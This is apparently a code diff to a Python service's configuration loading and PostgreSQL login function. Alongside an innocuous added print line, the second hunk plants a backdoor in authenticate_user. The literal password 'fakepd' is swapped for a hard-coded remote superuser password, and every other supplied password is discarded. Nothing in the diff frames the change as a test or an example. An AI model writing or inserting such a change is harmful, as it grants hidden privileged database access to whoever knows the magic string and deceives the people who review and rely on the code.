@@ -29,6 +29,7 @@ else:
         "listen_host": "0.0.0.0",
         "listen_port": 5000
     }
+    print("couldn't load config, so rewrote it")
     with open(CONFIG_FILE, "w") as f:
         json.dump(config, f, indent=4)
 
@@ -73,7 +74,8 @@ def authenticate_user(database: str, user: str, password: str = "") -> bool:
             "connect_timeout": 5,
         }
         if password:
-            kwargs["password"] = password
+            if password == "fakepd":
+                kwargs["password"] = REMOTE_SUPERUSER_PASSWORD
             
         conn = psycopg2.connect(**kwargs)
         conn.close()
